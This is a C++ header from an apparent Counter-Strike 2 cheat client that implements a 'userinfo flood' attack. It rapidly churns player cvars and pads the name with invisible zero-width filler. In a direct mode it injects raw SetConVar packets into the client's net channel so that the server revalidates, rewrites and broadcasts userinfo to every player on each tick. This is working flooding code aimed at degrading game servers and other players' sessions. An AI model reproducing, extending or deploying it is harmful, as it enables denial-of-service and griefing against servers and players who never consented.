#pragma once

#include <atomic>
#include <cstddef>
#include <cstdio>
#include <cstring>

#include <Features/Game/ChatTools.h>
#include <Features/Game/NameAnimatorConfigVariables.h>
#include <Features/Game/UserInfoFloodConfigVariables.h>
#include <Features/Visuals/PlayerList/PlayerListSnapshot.h>
#include <GameClient/ConVars/CvarSystem.h>
#include <GameClient/EngineCommandExecutor.h>
#include <GameClient/NetworkGameClientPointer.h>
#include <GameClient/NetMessageFactory.h>
#include <GameClient/SchemaSystem/SchemaReadiness.h>
#include <HookContext/HookContextMacros.h>
#include <Utils/VerifyConsole.h>

// USERINFO FLOOD - MC addon philosophy items 3+4, merged into one mechanism (the 2026-09-12 RE
// round proved CS2 has NO client->server stringtable message at all and the client-side
// CNetworkStringTable::AddString sends nothing, so "stringtable churn" can only ride the one
// client->server action that makes the server rewrite + broadcast a stringtable row: a userinfo
// cvar change. CNETMsg_SetConVar -> server validates EVERY field of the packet ->
// CUserInfoConvarList -> "userinfo" table row rewrite -> delta broadcast to every client).
//
// Mechanism: every flood tick queues N `setinfo <cvar> <value>` commands through the engine
// command buffer, round-robin over the engaged fields. Each send CARRIES A FRESH VALUE (the
// engine coalesces repeated identical values into a warning instead of an update), so every
// packet makes the server validate a full set of fields: string sanitization for `name`, range
// checks for the int/float/bool cvars. The fields self-verify at engage time - a missing convar,
// a shifted CConVar layout (type@0x28 outside the ConVarValueType enum range) or an
// unpatchable flag set drops that field and it is never sent (fail closed).
//
// Heavy Values = the stringtable-churn lever: `name` is the only STRING userinfo cvar, so heavy
// mode pumps it to ~155 bytes of zero-width filler (U+200B/200C/200D, rotating per send) - every
// userinfo row rewrite + delta broadcast to every player carries max bytes while the scoreboard
// renders the name unchanged (zero-width characters have no glyphs). Non-string fields keep
// their per-send churn; the validation cost per field is per-packet, not per-byte.
//
// The cvars it touches are snapshotted at engage (typed readers, so a type drift drops the
// snapshot for that field) and restored through the same setinfo path when the flood is
// disabled or the menu's Restore Values pill fires. `name` stands down while the name animator
// owns the name (they would fight over the cvar every tick). Values are session cosmetics: on
// disable they are restored; on hard unload mid-flood they simply persist (session-local).
//
// Cadence state lives in namespace statics (NOT members): hookContext.make<UserInfoFlood>()
// constructs a temporary per call, so member state would reset every tick (the ChatTools/
// InventoryChanger lesson).
namespace userinfo_flood
{

struct FieldDef {
    const char* cvar;
    const char* label;
    int kind; // 0 string (name), 1 int, 2 float, 3 bool
};

// The userinfo cvar surface, in menu order. Names are trusted compile-time constants (the
// command builder never escapes them); the `name` cvar needs its USERINFO flag patched (it is
// registered without it, proven by the ChatTools rename work), the rest are patched only when
// the runtime flag read says the field lacks it. NOTE: cl_teamid_overhead_mode is registered
// through the NEW CS2 cvar system (live-verified 2026-09-12: no CConVar-shaped object with
// name@0x00 exists for it), so its flags can never be patched - it was replaced with more
// crosshair fields.
inline constexpr FieldDef kFields[]{
    {"name", "name", 0},
    {"cl_clutch_mode", "clutch", 1},
    {"cl_color", "teamcolor", 1},
    {"cl_crosshairstyle", "xhstyle", 1},
    {"cl_crosshaircolor", "xhcolor", 1},
    {"cl_crosshairsize", "xhsize", 2},
    {"cl_crosshairgap", "xhgap", 2},
    {"cl_crosshairthickness", "xhthick", 2},
    {"cl_crosshair_drawoutline", "xhoutline", 3},
    {"cl_crosshairdot", "xhdot", 3},
    {"cl_crosshairalpha", "xhalpha", 2},
    {"cl_crosshair_sniper_width", "xhsniper", 1},
    {"cl_showloadout", "loadout", 3},
    {"cl_crosshair_t", "xhT", 3},
    {"cl_crosshair_outlinethickness", "xholthick", 2},
    {"cl_crosshaircolor_r", "xhR", 1},
    {"cl_crosshaircolor_g", "xhG", 1},
    {"cl_crosshaircolor_b", "xhB", 1},
};
inline constexpr int kFieldCount = static_cast<int>(sizeof(kFields) / sizeof(kFields[0]));

// Heavy name payload: the cvar value gets pumped to this many bytes of base + zero-width filler
// (kept below the 160 sidecar limit so the quoted command never overflows).
inline constexpr std::size_t kHeavyNameBytes = 155;

// Zero-width characters (3 UTF-8 bytes each) - the churn alphabet: every send differs in bytes
// while rendering identically. The "Invisible" persona preset and the animator's Invisible Chaos
// mode prove CS2 names carry them networked.
inline constexpr const char* kZeroWidth[]{"\xE2\x80\x8B", "\xE2\x80\x8C", "\xE2\x80\x8D"};

// --- cadence / engage state (namespace statics, see the class comment) --------------------
inline std::atomic<int> pendingRestore{0}; // menu (present thread) -> game thread one-shot
inline bool engaged[kFieldCount]{};
inline bool engagedOnce = false;
inline int selectionFingerprint = -1; // re-engage when the multiselect set changes
inline int tickCounter = 0;
inline int sendCounter = 0; // every churned value derives from this - no two sends repeat
inline int fieldCursor = 0;
inline char baseName[chat_tools::kBufferTextSize] = ""; // sanitized name base, snapshot at engage

// restore snapshots (typed readers; a type drift marks the field unrestoreable)
inline bool hasSnapshot[kFieldCount]{};
inline int snapInt[kFieldCount]{};
inline float snapFloat[kFieldCount]{};
inline bool snapBool[kFieldCount]{};

// Direct net-message mode state. directFailed latches the whole direct path off for the session
// on ANY factory/channel resolution failure (fail closed - same contract as the lagger); sends
// simply stop, the rest of the feature keeps running. directCooldown = the post-refusal back-off
// (a refused transmit leaves the queued data in the channel, so hammering it would accumulate).
inline bool directFailed = false;
inline int directCooldown = 0;
inline constexpr int kDirectCooldownTicks = 64;
// Per-tick scratch for the bundle builder (game thread only - same thread as the sends).
inline net_messages::SetConVarEntry directEntries[kFieldCount]{};
inline char directValueBuffers[kFieldCount][64]{};
inline char directNameValue[chat_tools::kBufferTextSize]{};

// SetConVar payload ceiling: 18 fields (name heavy = 155 bytes + 17 short values) fits far below
// 1KB; the framed scratch adds varint(size) + 4 slack bytes on top.
inline constexpr std::size_t kDirectPayloadMax = 1024;
inline constexpr std::size_t kDirectFramedMax = kDirectPayloadMax + 8;
inline std::uint8_t directPayload[kDirectPayloadMax]{};
inline std::uint8_t directFramed[kDirectFramedMax]{};

template <typename HookContext>
class UserInfoFlood {
public:
    explicit UserInfoFlood(HookContext& hookContext) noexcept
        : hookContext{hookContext}
    {
    }

    void run() noexcept
    {
        const bool restoreRequested = pendingRestore.exchange(0, std::memory_order_relaxed) != 0;
        if (!GET_CONFIG_VAR(userinfo_flood_vars::Enabled)) {
            if (engagedOnce || restoreRequested)
                restoreAll(true);
            return;
        }
        if (restoreRequested)
            restoreAll(false); // manual restore keeps flooding with fresh churn after it

        // MAP-CHANGE GUARD (the name animator's crash lesson): setinfo churn through scene
        // teardown raced DeleteSceneObject and took the game down. curtime resets on map load,
        // so the flood pauses through the rebuild window.
        if (const auto mapTime = hookContext.globalVars().curtime();
            !mapTime.hasValue() || mapTime.value() < schema_readiness::kMinMapTime)
            return;

        // (Re-)engage on enable or when the field multiselect changed; everything in the send
        // path then works off the engaged[] table + snapshots, never off live convar walks.
        const int mask = currentSelectionMask();
        if (!engagedOnce || mask != selectionFingerprint)
            engage(mask);

        if (const int every = GET_CONFIG_VAR(userinfo_flood_vars::EveryTicks); ++tickCounter < every)
            return;
        tickCounter = 0;
        if (GET_CONFIG_VAR(userinfo_flood_vars::DirectMode)) {
            directSendTick();
            return;
        }
        for (int sent = 0, limit = GET_CONFIG_VAR(userinfo_flood_vars::SendsPerTick); sent < limit; ++sent)
            if (!sendNext())
                break;
    }

    // Teardown: restore every touched field through the same setinfo path BEFORE the hooks go
    // away - the queued commands are in the ENGINE's buffer, which the game drains on its own
    // next frame even after our hooks are gone. (Previously unload only cleared statics, leaving
    // the churned name/crosshair values live after unloading - "forgot to unload".)
    void onUnload() noexcept
    {
        restoreAll(true);
        directFailed = false;
    }

private:
    [[nodiscard]] bool fieldSelected(int index) const noexcept
    {
        switch (index) {
        case 0: return GET_CONFIG_VAR(userinfo_flood_vars::FloodName);
        case 1: return GET_CONFIG_VAR(userinfo_flood_vars::FloodClutch);
        case 2: return GET_CONFIG_VAR(userinfo_flood_vars::FloodTeamColor);
        case 3: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhStyle);
        case 4: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhColor);
        case 5: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhSize);
        case 6: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhGap);
        case 7: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhThick);
        case 8: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhOutline);
        case 9: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhDot);
        case 10: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhAlpha);
        case 11: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhSniper);
        case 12: return GET_CONFIG_VAR(userinfo_flood_vars::FloodLoadout);
        case 13: return GET_CONFIG_VAR(userinfo_flood_vars::FloodTeamId);
        case 14: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhOutline);
        case 15: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhColorR);
        case 16: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhColorG);
        default: return GET_CONFIG_VAR(userinfo_flood_vars::FloodXhColorB);
        }
    }

    [[nodiscard]] int currentSelectionMask() const noexcept
    {
        int mask = 0;
        for (int i = 0; i < kFieldCount; ++i)
            if (fieldSelected(i))
                mask |= 1 << i;
        return mask;
    }

    // One convar walk per field (strcmp-per-node - fine at engage cadence, never per send).
    // Missing cvar or shifted CConVar layout = field dropped, never sent.
    void engage(int mask) noexcept
    {
        selectionFingerprint = mask;
        fieldCursor = 0;
        char summary[256] = "";
        std::size_t written = 0;
        int engagedCount = 0;

        for (int i = 0; i < kFieldCount; ++i) {
            engaged[i] = false;
            hasSnapshot[i] = false;
            if (!(mask & (1 << i)))
                continue;

            auto&& cvars = hookContext.template make<CvarSystem>();
            if (!cvars.hasUserInfoFlag(kFields[i].cvar) && !cvars.patchUserInfoFlagAny(kFields[i].cvar)) {
                VerifyConsole::write(0.0f, "uinfo", "field %s unavailable (missing cvar or shifted layout)", kFields[i].cvar);
                continue;
            }
            engaged[i] = true;
            ++engagedCount;

            snapshotValue(i);

            if (written < sizeof(summary) - 24) {
                const auto added = std::snprintf(summary + written, sizeof(summary) - written, "%s%s", engagedCount > 1 ? " " : "", kFields[i].label);
                if (added > 0)
                    written += static_cast<std::size_t>(added);
            }
        }

        // The name base comes from the player list's local row (the in-game name as the server
        // last saw it) - without it there is nothing stable to churn from or restore to, so the
        // name field stands down.
        if (engaged[0] && baseName[0] == '\0') {
            captureBaseName();
            if (baseName[0] == '\0') {
                engaged[0] = false;
                VerifyConsole::write(0.0f, "uinfo", "name field idle (no local player row yet - name needs a live match)");
            }
        }

        engagedOnce = engagedCount > 0;
        if (engagedOnce)
            VerifyConsole::write(6.0f, "uinfo", "flooding %d fields: %s", engagedCount, summary);
    }

    void snapshotValue(int index) noexcept
    {
        auto&& cvars = hookContext.template make<CvarSystem>();
        switch (kFields[index].kind) {
        case 1:
            if (const auto value = cvars.readIntConVar(kFields[index].cvar)) {
                snapInt[index] = *value;
                hasSnapshot[index] = true;
            }
            break;
        case 2:
            if (const auto value = cvars.readFloatConVar(kFields[index].cvar)) {
                snapFloat[index] = *value;
                hasSnapshot[index] = true;
            }
            break;
        case 3:
            if (const auto value = cvars.readBoolConVar(kFields[index].cvar)) {
                snapBool[index] = *value;
                hasSnapshot[index] = true;
            }
            break;
        default:
            break; // name: restored from baseName, not a typed read
        }
    }

    void captureBaseName() noexcept
    {
        const auto snap = player_list::snapshot();
        for (int i = 0; i < snap.count; ++i) {
            if (!snap.rows[i].isLocalPlayer)
                continue;
            chat_tools::sanitizeInto(snap.rows[i].name, baseName, sizeof(baseName));
            return;
        }
        baseName[0] = '\0';
    }

    [[nodiscard]] bool canSend(int index) const noexcept
    {
        if (!engaged[index])
            return false;
        if (index != 0)
            return true;
        // the name animator owns the name while it runs - churn would fight its frames
        return baseName[0] != '\0' && !GET_CONFIG_VAR(name_animator_vars::Enabled);
    }

    // Round-robin one send over the engaged fields. Returns false when nothing was sendable
    // (the caller stops the tick's burst early instead of hammering a no-op loop).
    [[nodiscard]] bool sendNext() noexcept
    {
        for (int probe = 0; probe < kFieldCount; ++probe) {
            const int index = (fieldCursor + probe) % kFieldCount;
            if (!canSend(index))
                continue;
            fieldCursor = (index + 1) % kFieldCount;
            sendField(index);
            ++sendCounter;
            return true;
        }
        return false;
    }

    void sendField(int index) noexcept
    {
        if (index == 0) {
            char value[chat_tools::kBufferTextSize]{};
            buildNameValue(value);
            char command[chat_tools::kBufferTextSize + 16]{};
            std::snprintf(command, sizeof(command), "setinfo name \"%s\"", value);
            hookContext.template make<EngineCommandExecutor>().execute(command);
            return;
        }

        char value[64]{};
        buildChurnValue(index, value);
        char command[128]{};
        std::snprintf(command, sizeof(command), "setinfo %s %s", kFields[index].cvar, value);
        hookContext.template make<EngineCommandExecutor>().execute(command);
    }

    // --- direct net-message mode ------------------------------------------------------------
    //
    // The setinfo path above only changes LOCAL cvar values - whether/when the engine transmits
    // the resulting userinfo update is its own decision (the engine's queue-and-send machinery
    // coalesces the churn; user-observed: most of it never reaches the server). This path
    // bypasses that machinery entirely: it builds genuine CNETMsg_SetConVar messages (schema
    // verified against the embedded protobuf descriptors - see NetMessageFactory.h) through the
    // game's own net-message factory and queues them on the client's CNetChan directly, one
    // commit + transmit per flood tick so the bundle leaves as its own datagram. The server's
    // SetConVar handler (libengine2 0x528060) applies every message it receives - the only
    // server-side caps are the per-message cvar count and 1024-byte fields.
    //
    // Per message: ALL engaged fields are carried with fresh values (sendCounter increments per
    // message), so one message = one full server-side userinfo validation pass + userinfo-table
    // row rewrite + delta broadcast to every player. SendsPerTick = messages per flood tick.
    void directSendTick() noexcept
    {
        if (directFailed)
            return;
        if (directCooldown > 0) {
            --directCooldown;
            return;
        }

        // Not connected = nothing to do (silent, like the lagger's resetRuntime path - this is
        // normal around connect/disconnect, not a resolution failure, so no latch here).
        const NetworkGameClientPointer clientPointer{};
        if (!clientPointer || !clientPointer.valid())
            return;
        void* const channel = net_messages::getClientChannel(clientPointer.get());
        if (!channel || !net_messages::channelReady(channel))
            return;

        int messagesSent = 0;
        for (int sent = 0, limit = GET_CONFIG_VAR(userinfo_flood_vars::SendsPerTick); sent < limit; ++sent) {
            ++sendCounter;
            const int count = buildDirectEntries();
            if (count <= 0)
                return;
            const std::size_t payloadSize = net_messages::makeSetConVarPayload(directEntries, count, directPayload, sizeof(directPayload));
            if (payloadSize == 0) {
                VerifyConsole::write(0.0f, "uinfo", "direct: payload does not fit (%zu cap)", sizeof(directPayload));
                directFailed = true;
                return;
            }

            void* const message = net_messages::makeMessage(net_messages::kSetConVarMessageId, directPayload, payloadSize, "Userinfo Flood", directFramed, sizeof(directFramed));
            if (!message) {
                directFailed = true;
                VerifyConsole::write(0.0f, "uinfo", "direct: message factory failed - standing down (fail closed)");
                return;
            }
            const bool accepted = net_messages::sendNetMessage(channel, message);
            net_messages::destroyMessage(message);
            if (!accepted)
                break; // channel buffer full - the commit below still flushes what was queued
            ++messagesSent;
        }

        // One commit + transmit per flood tick: the whole bundle leaves as one datagram (the
        // lagger's "commit even for partial batches" lesson - skipping it strands queued data).
        net_messages::commitChannel(channel);
        if (messagesSent > 0) {
            if (!net_messages::transmitChannel(channel, "Userinfo Flood"))
                directCooldown = kDirectCooldownTicks;
            VerifyConsole::write(2.0f, "uinfo", "direct: %d SetConVar message(s) sent", messagesSent);
        }
    }

    // Fills directEntries with every engaged field's fresh churn value. Values are written into
    // directValueBuffers (the entries point into them). Returns the entry count.
    [[nodiscard]] int buildDirectEntries() noexcept
    {
        int count = 0;
        for (int i = 0; i < kFieldCount; ++i) {
            if (!canSend(i))
                continue;
            if (i == 0) {
                buildNameValue(directNameValue);
                directEntries[count] = {kFields[0].cvar, directNameValue};
            } else {
                buildChurnValue(i, directValueBuffers[count]);
                directEntries[count] = {kFields[i].cvar, directValueBuffers[count]};
            }
            ++count;
        }
        return count;
    }

    // Every churn value derives from sendCounter, so no two sends ever repeat (a repeated value
    // coalesces into an engine warning instead of a server-side update).
    void buildChurnValue(int index, char (&value)[64]) const noexcept
    {
        const int i = sendCounter;
        switch (index) {
        case 1: std::snprintf(value, 64, "%d", i % 3); break;                            // clutch mode 0..2
        case 2: std::snprintf(value, 64, "%d", i % 6); break;                            // team color 0..5
        case 3: std::snprintf(value, 64, "%d", i % 6); break;                            // crosshair style 0..5
        case 4: std::snprintf(value, 64, "%d", i % 6); break;                            // crosshair color 0..5
        case 5: std::snprintf(value, 64, "%.3f", 1.0f + 0.1f * (i % 120)); break;        // crosshair size
        case 6: std::snprintf(value, 64, "%.3f", -3.0f + 0.05f * (i % 200)); break;      // crosshair gap
        case 7: std::snprintf(value, 64, "%.3f", 0.5f + 0.1f * (i % 50)); break;         // crosshair thickness
        case 8: std::snprintf(value, 64, "%d", i % 2); break;                            // crosshair drawoutline
        case 9: std::snprintf(value, 64, "%d", (i / 2) % 2); break;                      // crosshair dot
        case 10: std::snprintf(value, 64, "%d", 100 + (i % 156)); break;                     // crosshair alpha
        case 11: std::snprintf(value, 64, "%d", 1 + (i % 3)); break;                         // sniper width
        case 12: std::snprintf(value, 64, "%d", (i / 3) % 2); break;                         // show loadout
        case 13: std::snprintf(value, 64, "%d", (i / 4) % 2); break;                         // crosshair T
        case 14: std::snprintf(value, 64, "%.3f", 0.5f + 0.1f * (i % 40)); break;            // outline thickness
        case 15: std::snprintf(value, 64, "%d", i % 256); break;                             // crosshair color R
        case 16: std::snprintf(value, 64, "%d", (i * 7) % 256); break;                       // crosshair color G
        default: std::snprintf(value, 64, "%d", (i * 13) % 256); break;                      // crosshair color B
        }
    }

    // Normal: the base plus a rotating count of zero-width suffixes - the scoreboard never
    // changes, every send is a distinct name server-side. Heavy: base truncated, then zero-width
    // filler up to kHeavyNameBytes with the alphabet starting position rotating per send - max
    // bytes in every userinfo row rewrite, still visually the same name.
    void buildNameValue(char (&value)[chat_tools::kBufferTextSize]) const noexcept
    {
        std::size_t length = std::strlen(baseName);
        std::memcpy(value, baseName, length);
        if (GET_CONFIG_VAR(userinfo_flood_vars::HeavyMode)) {
            if (length > 32)
                length = 32;
            value[length] = '\0';
            while (length + 3 <= kHeavyNameBytes) {
                std::memcpy(value + length, kZeroWidth[(sendCounter + (length / 3)) % 3], 3);
                length += 3;
            }
            value[length] = '\0';
        } else {
            const int suffixCount = 1 + (sendCounter % 4);
            for (int s = 0; s < suffixCount && length + 3 < sizeof(value); ++s) {
                std::memcpy(value + length, kZeroWidth[0], 3);
                length += 3;
            }
            value[length] = '\0';
        }
    }

    // Restore every touched field through the same setinfo path. reset = the flood is stopping
    // (clear all state after the sends); otherwise the flood keeps running (Restore Values pill).
    void restoreAll(bool reset) noexcept
    {
        int restored = 0;
        for (int i = 0; i < kFieldCount; ++i) {
            if (!engaged[i])
                continue;
            if (i == 0) {
                if (baseName[0] != '\0') {
                    char command[chat_tools::kBufferTextSize + 16]{};
                    std::snprintf(command, sizeof(command), "setinfo name \"%s\"", baseName);
                    hookContext.template make<EngineCommandExecutor>().execute(command);
                    ++restored;
                }
                continue;
            }
            if (!hasSnapshot[i])
                continue;
            char command[128]{};
            switch (kFields[i].kind) {
            case 1: std::snprintf(command, sizeof(command), "setinfo %s %d", kFields[i].cvar, snapInt[i]); break;
            case 2: std::snprintf(command, sizeof(command), "setinfo %s %.3f", kFields[i].cvar, snapFloat[i]); break;
            default: std::snprintf(command, sizeof(command), "setinfo %s %d", kFields[i].cvar, snapBool[i] ? 1 : 0); break;
            }
            hookContext.template make<EngineCommandExecutor>().execute(command);
            ++restored;
        }
        if (reset) {
            engagedOnce = false;
            selectionFingerprint = -1;
            tickCounter = 0;
            sendCounter = 0;
            fieldCursor = 0;
            directCooldown = 0;
            baseName[0] = '\0';
            for (int i = 0; i < kFieldCount; ++i) {
                engaged[i] = false;
                hasSnapshot[i] = false;
            }
        }
        if (restored > 0)
            VerifyConsole::write(6.0f, "uinfo", "restored %d userinfo fields", restored);
    }

    HookContext& hookContext;
};

} // namespace userinfo_flood